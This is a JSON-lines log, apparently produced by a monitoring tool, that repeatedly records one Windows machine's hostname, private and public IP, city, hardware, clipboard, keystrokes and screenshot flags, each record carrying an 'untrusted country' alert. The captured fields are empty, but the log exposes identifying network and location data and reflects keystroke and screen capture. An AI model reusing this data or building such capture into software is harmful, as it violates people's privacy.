{"timestamp": "2025-05-19T11:20:26.173602", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "254d5e0f4707e09b6b390f4532cf8115736c284c49f73d8c3a1750394e58b1a3", "log_hash": "abc9cfc3ebf1c25576dba8a661e04aaf052aaec5734b1e86a2fa1909272cd9dc"}
{"timestamp": "2025-05-19T11:20:52.876332", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c0c8714aed24ccd5f5cbd83a8cacd116b9b6241a1eba825d7714e5150a5cb035", "log_hash": "5489ca20eedcf3692596e0c1d73f760cfd77a78e3f6018cf880399a340b02090"}
{"timestamp": "2025-05-19T11:21:19.844576", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f1b112191d385b33c2aad7aab2b25e97b8cd9d40734d2ed5644b50a1dcf91f09", "log_hash": "40d9d44a5e413e3499cdfb69ca7f936baa2d25f9ef9cfda40be9c01efdebd0c1"}
{"timestamp": "2025-05-19T11:21:46.419387", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bc40304cda8d9975c2e5d8e00d37f8f0ca12aeebce87a1c51942a6b270fed4ec", "log_hash": "93b2a894dcc1e188e2608213fb5e266218e96eeb7f6786671a5be874f7535953"}
{"timestamp": "2025-05-19T11:22:13.480551", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ca1d1a77469b3cb5c5ea53677053f6c1bee8444834c0b79ddb4f02a06f43b109", "log_hash": "20b78fdccb2223b6b33c543c9e6e4b049b793a0dd3db3e4aea7f9eadbaf1e178"}
{"timestamp": "2025-05-19T11:22:39.965742", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "5f137f06f0d81ef08c80543638aee35485a843ca505dbed613d08edf529dcd1c", "log_hash": "93979f68b6773628f168e3f2ca83dd3cbf992741b84c9642009c0d7ce48a0c99"}
{"timestamp": "2025-05-19T11:23:06.290447", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4b9904462a3845a323b4978a20d0995ec0110cb797c0e49deed04fcb70b015db", "log_hash": "bd0bc64d1f9359908df74c41068b41ba8d2a53e129922f03e1cb2c293e11200f"}
{"timestamp": "2025-05-19T11:23:32.777418", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e970b87e44917f68a548159b7703eff6aca530b36c8d9b22e71053ded2162458", "log_hash": "7a07060aa121b754f67e3b22460319b238ff782ef4b3b34b1a5b97ae9077107d"}
{"timestamp": "2025-05-19T11:23:59.304522", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "005aac4e3991803a4eb4dae19ffd201459fdea5cd52160307559d2e389493932", "log_hash": "eb9f280a2977860bc2b10972faaa68a42533957f1649a5f1a5d0831d1173d1d0"}
{"timestamp": "2025-05-19T11:24:26.049803", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "1e3644229918460ee8d678f6f6b7012656286191ebb01d51d5c4b0eee5d2d602", "log_hash": "dedb3a8795583c96998e5f3a7b676aa17d169abe82a75ae8e8bc7bf2db790c55"}
{"timestamp": "2025-05-19T11:24:52.564671", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bcfce3ff2a37fd521106cfd214cdb7277e20505a30253d73154b9039f3b46562", "log_hash": "354eb3a04f10d3183af7bb6420ef6af22171172937ebffa8483912c13b763dab"}
{"timestamp": "2025-05-19T11:25:19.121765", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b17a07b9752d60d3b19b663a712b99c2d2fa91e222a6df0adb2db5448ce780af", "log_hash": "483af7930dd232ea576506e2c8961ccf6b15a29616753d4c8d553434e392c600"}
{"timestamp": "2025-05-19T11:25:45.858791", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e1fb06954c1f85a2b64437d777e4249169f230fcaa75439f4045803d5e76554a", "log_hash": "b103927846ae45ecc6f08e88d97281b4a0581115003a80599d1e8b3e1832eb2a"}
{"timestamp": "2025-05-19T11:26:12.625064", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "5464cd0ea291d6311065a3a9b7ec71a6d841f98c8f14865a424dca2d629b92e5", "log_hash": "356b3e4491f6dde2d33941a56f6174fce848ab5fdcd70cdc08bcb2a8dbcbd0fe"}
{"timestamp": "2025-05-19T11:26:39.053444", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "1cdb4802f5a779f486119964c27c12ffb110f4bde2066df2e54a90a70f2b2fca", "log_hash": "747b273bf28f5df4731549e563698e10cb2d6f49c23adfc3af41c468d12b39b2"}
{"timestamp": "2025-05-19T11:27:05.687930", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4b01b25b22b71206d754286da60c1292ee615311937d5ca2b5ab6f64b6c9169e", "log_hash": "65e238bea70cbaa1d95a5be699b7d00e2a4c3c94f09a4962237c40ea8d42085e"}
{"timestamp": "2025-05-19T11:27:32.076363", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "e8dbea0f11023c8f4383ea0597c67fc05e89790fee20650390da19cc60355557", "log_hash": "d3d3b1eefe751dfc86866ed91685a24bdc342b35af8b4044e9565a4976a86c42"}
{"timestamp": "2025-05-19T11:27:58.641166", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "0be9114205563c26294dbe26c99757947eab770a7149e7db1d6dbea811207d8f", "log_hash": "50a8ba6799db06931099cb13333ecb1efc6e587c22cf919e44d718c39a8d8184"}
{"timestamp": "2025-05-19T11:28:25.205057", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4f91dcfac438bfe4d5151738a20e05298ef71e9abfc94d3d7db222988ff27965", "log_hash": "7c89b663b68a365b3c1fe8decf20b70ba57f9bc3bd220abc7d99b188ead88d18"}
{"timestamp": "2025-05-19T11:28:51.724356", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c586abbdb1a85e9c81438cc4cf8d40435c3964632f7b12daffe6383c0d721a1d", "log_hash": "7979dbef239599fc4de04591045ad15b1dd2acd94c330359c3bdb2db015aeeb4"}
{"timestamp": "2025-05-19T11:29:18.518787", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "4fa31ca0dad10efcbbdc740f1a1f9a47f4688bb57e3a6cbca0f4c6ac9643e8ab", "log_hash": "372d9e49425c1c52f215e980d8a0a9e3bede58d06329cd9e67784a22fffa6fd3"}
{"timestamp": "2025-05-19T11:29:45.298725", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2f3e68bae6f0706b1b64ad16f7b7004b3ed5f1de9a7007b1b7e547e92d5212dc", "log_hash": "ad5f8601af77f55830d268d1f475c2aa42c9a672ec1c383654a160c4784d58f9"}
{"timestamp": "2025-05-19T11:30:11.974825", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "6ccf41e1ff988ad9207c47640c44c1ce6613867a97c6a9945d6a25b0a0ac709c", "log_hash": "5196018909d823bf70042607ed25e01cd72244b2459d788ab6b3c10379a20b3d"}
{"timestamp": "2025-05-19T11:30:39.032709", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "efe0eaada0f33b0b28d9d0fcb1a28d0416109f477927e04295138761b5f34698", "log_hash": "d34f8fe1fa4a12151b0f305c7d000f6981a26f9741c4d578fa47221bee3bbfd4"}
{"timestamp": "2025-05-19T11:31:05.597081", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "a3554788d54f9ae951880dc61d3bc7e9e01328d6d44d143401067570e7e5490e", "log_hash": "cd9a1ab23af658202628726d8c34bfb59beba524449c17ef0323d4108117623d"}
{"timestamp": "2025-05-19T11:31:32.380880", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f6a56855f16516977b3cb3fb49c0d62cffb69383d98ea1c86898fc1285d85458", "log_hash": "d95a0d785c6a0a0cb7489198b0d2a55e1f17600e811119c059d3192e36c05385"}
{"timestamp": "2025-05-19T11:31:59.160188", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "115abeda01db80607fa0c86273b8952a90cc3c33ce557e5c658712ad21acad21", "log_hash": "5544ce991fcc1559a4a902e8ae5f7f8fadc1d870c45303858c88695907682997"}
{"timestamp": "2025-05-19T11:32:25.856447", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "1c73c504a4fe690b55def6be8be7be7c20affccbc931061b410d8a07e8a6950e", "log_hash": "db4996c655f36d2910688d20612583e6e0ba849bc405e81e3e3bae258d080dbd"}
{"timestamp": "2025-05-19T11:32:52.486590", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f6df1825fbbe22a8e6dbea588cd0b9de9b4aea178e62cb858ee9403f952209b8", "log_hash": "4a8a4c6d7c9cc072de990402fe86bf4d00412d1095c78b689fa67863d340e271"}
{"timestamp": "2025-05-19T11:33:19.198822", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "f3722e931f7400c0d434bfead03ac79dfb0673080b5d88ed6d040c7e61031f11", "log_hash": "6a484efd285ec1bd91ca6fc80687d84a23077e72858f42d6ba50b87e99b12093"}
{"timestamp": "2025-05-19T11:33:45.631560", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9e19b60098daddce22e258fc3fb2f5bb729ab47567b4fbec2aa1af061fd0edc3", "log_hash": "360f4beeef9a53b3e05372b3ac492e244fd2f57c9995e732ea4ada6e025bb52f"}
{"timestamp": "2025-05-19T11:34:12.447147", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "104d772cb1b81624561a90169541f5d8ac761d37ae19a6ad6b0613ca71b8bb3c", "log_hash": "2b6c3cb754e3ff254a2ed7e83e66172b9c4706fd0114e976dce3a72e7f548db8"}
{"timestamp": "2025-05-19T11:34:39.032948", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "580dc0202f5448c9c3acb406d6591d7d109c5902597e8a1b8c327ac138ce5670", "log_hash": "716550778d151ea0622a8d1179c8006cd9f0e85374d309b178e1356001d664ab"}
{"timestamp": "2025-05-19T11:35:05.759691", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "acfd0cd59aaf01913a5f8dc802b41fe0ebcae4f96827036775d9e2d89ade7ed1", "log_hash": "f20c4b3d79afe192b9ec147c0e27d3facb3d7e08aca926e7ee562508dd49f100"}
{"timestamp": "2025-05-19T11:35:32.477137", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d8f1d39e3dd3ad4d6418bc49cd951570410b8b8448c21d1cfe846fe71735270f", "log_hash": "7face3774d426a1280d44fdb036a6e3066e7e18acf395a53144590d9a2047f0f"}
{"timestamp": "2025-05-19T11:35:59.100089", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "86817246cbc468f978a467abdac147b793f4a8a13ecbd3f62944bfd64255f1ab", "log_hash": "a87e2c3fa8691bb8483a8c863b3eeadbf4bd010e633213c1e9c4de6af9ba2503"}
{"timestamp": "2025-05-19T11:36:25.660855", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "78ab710530c735a7e81fd592619ecf5b2b6034b838b8f155a5deaf57d343204e", "log_hash": "22839dd7fc93919588e2a237fcaa8993dbf8d1a2aeccb2f95ca53869eb3b6255"}
{"timestamp": "2025-05-19T11:36:52.183818", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "ed8672490d06380979a77c776c8a07b35fe2fb6d76a09c1ef8fbc1074240af1c", "log_hash": "803926404a8466cd0a780f4af46a489c99880bf4a2fb4e2358f3a42d66b2b70b"}
{"timestamp": "2025-05-19T11:37:18.994286", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b79758475538a4085429850657dda2878e6497b2c77dc3bfdafc6f0018ac20fe", "log_hash": "d6d63d56864cc1931aff403ae1e87e20b050be03111c99f66bc882c7d6083337"}
